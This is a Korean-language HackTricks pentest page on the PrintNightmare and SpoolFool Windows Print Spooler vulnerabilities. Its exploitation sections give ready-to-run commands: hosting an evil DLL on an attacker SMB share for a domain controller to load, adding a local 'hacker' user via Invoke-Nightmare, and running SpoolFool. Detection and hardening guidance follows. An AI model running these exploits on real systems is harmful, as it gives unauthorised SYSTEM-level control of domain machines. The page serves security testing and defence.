# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare는 Windows **Print Spooler** 서비스의 취약점군을 통칭하는 이름으로, **SYSTEM 권한으로 arbitrary code execution**을 허용하며, spooler가 RPC를 통해 접근 가능한 경우 **domain controller와 file server에서 remote code execution (RCE)** 을 가능하게 합니다. 가장 널리 악용된 CVE는 **CVE-2021-1675** (처음에는 LPE로 분류됨)와 **CVE-2021-34527** (full RCE)입니다. 이후 발견된 **CVE-2021-34481 (“Point & Print”)** 및 **CVE-2022-21999 (“SpoolFool”)** 등의 이슈는 attack surface가 여전히 완전히 차단되지 않았음을 보여줍니다.

**driver-based RCE/LPE**가 아닌 spooler를 통한 **authentication coercion / relay**를 찾고 있다면 [printer coercion abuse에 관한 다른 페이지](printers-spooler-service-abuse.md)를 확인하세요. 이 페이지는 **drivers / DLLs를 SYSTEM 권한으로 loading**하는 데 초점을 둡니다.

---

## 1. Vulnerable components & CVEs

| Year | CVE | Short name | Primitive | Notes |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|2021년 6월 CU에서 patch되었지만 CVE-2021-34527에 의해 우회됨|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx`를 통해 authenticated users가 remote share에서 driver DLL을 loading할 수 있음. 2021년 8월 이후에는 일반적으로 weakened Point & Print policies가 필요함|
|2021|CVE-2021-34481|“Point & Print”|LPE|non-admin users에 의한 unsigned driver installation|
|2022|CVE-2022-21999|“SpoolFool”|LPE|arbitrary directory creation → DLL planting – 2021년 patch 이후에도 동작함|

이들은 모두 **MS-RPRN / MS-PAR RPC methods** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) 중 하나 또는 **Point & Print** 내부의 trust relationships를 악용합니다.

## 2. Exploitation techniques

### 2.1 Remote Domain Controller compromise (CVE-2021-34527)

authenticated 상태이지만 **non-privileged**인 domain user는 다음과 같은 방식으로 remote spooler(대개 DC)에서 **NT AUTHORITY\SYSTEM** 권한으로 arbitrary DLLs를 실행할 수 있습니다:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
널리 알려진 PoC로는 **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#), 그리고 **mimikatz**의 Benjamin Delpy가 만든 `misc::printnightmare / lsa::addsid` 모듈이 있습니다.

### 2.2 로컬 권한 상승 (지원되는 모든 Windows, 2021-2024)

동일한 API를 **로컬에서** 호출하여 `C:\Windows\System32\spool\drivers\x64\3\`에서 driver를 로드하고 SYSTEM 권한을 획득할 수 있습니다:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 패치된 호스트에서의 최신 triage

완전히 업데이트된 호스트에서는 Windows가 이제 기본적으로 **administrator-only** printer driver installation을 사용하기 때문에 public PrintNightmare PoC가 자주 실패합니다(2021년 8월 10일부터 `RestrictDriverInstallationToAdministrators=1`). exploit을 target에 실행하기 전에, 먼저 해당 환경에서 legacy printer deployment를 위해 이 safety change를 되돌렸는지 확인해야 합니다:<sup>[[3]](#references)</sup>
```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```
가장 주목할 만한 취약한 값은 일반적으로 다음과 같습니다.<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

PoC를 실행하기 전에 Linux에서 대상이 관련 print RPC 인터페이스를 노출하는지 빠르게 확인합니다:
```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```
일부 최신 public tooling은 DLL을 전송하기 전에 더 안전한 **check/list** workflow도 제공합니다:
```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```
> low-privileged user로 `RPC_E_ACCESS_DENIED` (`0x8001011b`)가 발생한다면, 일반적으로 transport failure가 아니라 2021년 이후의 기본 설정을 확인하고 있는 것입니다.

> Windows 11 22H2+ 및 최신 client build에서는 remote printing이 기본적으로 **RPC over TCP**를 사용하며, **RPC over named pipes** (`\PIPE\spoolss`)는 명시적으로 다시 활성화하지 않는 한 비활성화되어 있습니다. 일부 오래된 PoC와 lab note는 여전히 named pipe에 접근할 수 있다고 가정합니다.<sup>[[4]](#references)</sup>

### 2.4 “patched” 네트워크에서의 Package Point & Print abuse

많은 enterprise 환경에서는 helpdesk 또는 print-server workflow에서 여전히 non-admin user가 driver를 설치하거나 업데이트해야 했기 때문에, 최초의 2021년 patch 이후에도 정책상 **vulnerable 상태**로 남아 있었습니다. 실제 offensive playbook은 다음과 같습니다.

- security prompt가 완전히 비활성화되어 있다면 **classic arbitrary-DLL PrintNightmare**가 여전히 가장 짧은 경로입니다.
- `Only use Package Point and Print`가 활성화되어 있다면 일반적으로 raw DLL drop 대신 **signed package-aware driver** 경로로 pivot해야 합니다.<sup>[[3]](#references)</sup>
- 2024년 research에 따르면 **`Package Point and Print - Approved servers`는 그 자체로 강력한 trust boundary가 아닙니다**. attacker가 승인된 print server 중 하나에 대한 name resolution을 spoof하거나 hijack할 수 있다면, policy check를 충족하는 malicious server로 victim을 redirect할 수 있습니다.<sup>[[4]](#references)</sup>
- UNC hardening을 forced RPC-over-SMB와 함께 적용하더라도 modern client가 **RPC over TCP로 fallback**할 수 있으므로 불안정할 수 있습니다.<sup>[[4]](#references)</sup>

이 때문에 modern PrintNightmare-style exploitation은 원래의 2021 PoC를 수정 없이 재현하는 것보다 **enterprise printer deployment policy를 abuse**하는 데 더 가까운 경우가 많습니다.

### 2.5 SpoolFool (CVE-2022-21999) – 2021년 fix 우회

Microsoft의 2021년 patch는 remote driver loading을 차단했지만 **directory permission은 harden하지 않았습니다**. SpoolFool은 `SpoolDirectory` parameter를 abuse하여 `C:\Windows\System32\spool\drivers\` 아래에 arbitrary directory를 생성하고, payload DLL을 drop한 다음 spooler가 이를 load하도록 강제합니다.<sup>[[2]](#references)</sup>
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> 이 exploit은 2022년 2월 업데이트 이전의 fully-patched Windows 7 → Windows 11 및 Server 2012R2 → 2022에서 작동합니다<sup>[[2]](#references)</sup>

---

## 3. Detection & hunting

* **PrintService logs** – *Microsoft-Windows-PrintService/Operational* channel을 활성화하고, 성공 및 실패한 시도 모두에서 **Event ID 316**(driver 추가/업데이트, 일반적으로 DLL names 포함)을 모니터링합니다. 의심스러운 spooler module/driver load failures에 대해서는 **Event ID 808/811**과 함께 분석합니다.
* **Sysmon** – parent process가 **spoolsv.exe**인 경우 `C:\Windows\System32\spool\drivers\*` 내부에서 발생하는 `Event ID 7` (Image loaded) 또는 `11/23` (File write/delete)을 모니터링합니다.
* **Process lineage** – **spoolsv.exe**가 `cmd.exe`, `rundll32.exe`, PowerShell 또는 예상하지 못한 unsigned child process를 spawn할 때마다 alert를 생성합니다.
* **Network telemetry** – **spoolsv.exe**에서 attacker-controlled shares로 발생하는 예상하지 못한 SMB fetches 또는 print server로 동작해서는 안 되는 servers에서 발생하는 비정상적인 printer RPC traffic은 모두 high-signal leads입니다.

## 4. Mitigation & hardening

1. **Patch!** – Print Spooler service가 설치된 모든 Windows host에 최신 cumulative update를 적용합니다.
2. **필요하지 않은 환경에서는 spooler를 disable**합니다. 특히 Domain Controllers에서는 다음을 적용합니다.
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Local printing은 허용하면서 remote connections을 block**합니다 – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. 다음을 설정하여 **Point & Print를 admin-only로 유지**합니다.
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
자세한 guidance는 Microsoft KB5005652<sup>[[1]](#references)</sup>를 참조하십시오.
5. Business requirements 때문에 `RestrictDriverInstallationToAdministrators=0`을 사용해야 한다면, 다른 모든 printer policy를 **partial mitigation only**으로 간주합니다. 최소한 **package-aware drivers**를 우선 사용하고, **Only use Package Point and Print**를 enable하며, **Package Point and Print - Approved servers**를 명시적인 in-forest print servers로 제한합니다.<sup>[[3]](#references)</sup>
6. Printer mappings가 손상되었다는 이유만으로 **printer RPC privacy를 roll back하지 마십시오**. `RpcAuthnLevelPrivacyEnabled=0`으로 설정된 environments는 **CVE-2021-1678**을 위해 추가된 hardening을 되돌리는 것이며, 일반적으로 engagement 중 extra scrutiny가 필요합니다.<sup>[[4]](#references)</sup>

---

## 5. Related research / tools

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) modules
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – `-check`, `-list`, `-delete` modes를 지원하는 standard Impacket implementation
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – built-in SMB delivery, multi-target support 및 `MS-RPRN` / `MS-PAR` modes를 제공하는 wrapper
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – package Point & Print를 통한 bring-your-own-vulnerable-printer-driver abuse
* SpoolFool exploit 및 write-up
* SpoolFool 및 기타 spooler bugs를 위한 0patch micropatches

Driver를 load하는 대신 spooler를 통해 **coerce authentication**하려면 [printer spooler service abuse](printers-spooler-service-abuse.md)로 이동하십시오.

---

## References

- [1] [Microsoft – KB5005652: 새로운 Point & Print default driver installation behavior 관리](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool: CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – 2024년 PrintNightmare 실전 가이드](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – PrintNightmare는 아직 끝나지 않았다](https://itm4n.github.io/printnightmare-not-over/)

{{#include ../../banners/hacktricks-training.md}}
